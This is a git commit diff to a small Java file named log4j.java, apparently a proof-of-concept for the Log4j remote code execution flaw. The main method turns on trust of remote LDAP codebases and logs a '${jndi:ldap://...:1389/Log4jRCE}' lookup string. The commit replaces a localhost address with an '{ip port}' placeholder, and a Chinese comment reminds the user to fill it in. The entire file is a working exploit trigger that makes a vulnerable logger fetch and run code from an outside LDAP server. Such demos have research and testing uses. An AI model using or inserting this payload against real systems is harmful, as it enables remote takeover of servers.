c1deebc8424d7199a5c305d9bc1c957b649a434d
lfz <75104414+lfz97@users.noreply.github.com>
2021-12-11 03:19:21 +0800

    Update log4j.java

--- src/main/java/log4j.java
+++ src/main/java/log4j.java
@@ -7,6 +7,6 @@ public class log4j {
 
     public static void main(String[] args) {
         System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
-        logger.error("${jndi:ldap://127.0.0.1:1389/Log4jRCE}");
+        logger.error("${jndi:ldap://{ip port}:1389/Log4jRCE}"); //这里注意修改！
     }
 }
